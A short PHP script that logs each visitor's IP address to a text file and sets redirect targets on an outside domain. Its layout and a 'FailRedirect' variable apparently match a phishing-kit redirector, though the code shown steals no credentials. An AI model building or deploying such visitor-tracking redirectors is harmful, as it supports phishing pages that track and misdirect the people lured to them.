<?php

$ip = getenv("REMOTE_ADDR");
$message .= "$ip \n";
$fp = fopen("visitIP.txt","a");
fputs($fp,$message);


$pagelink="https://myecoleads.com/assets/newest/index.htm";
$FailRedirect="https://myecoleads.com/assets/newest/index.htm";
$redirecttype="2";// 1:header - 2:script
?>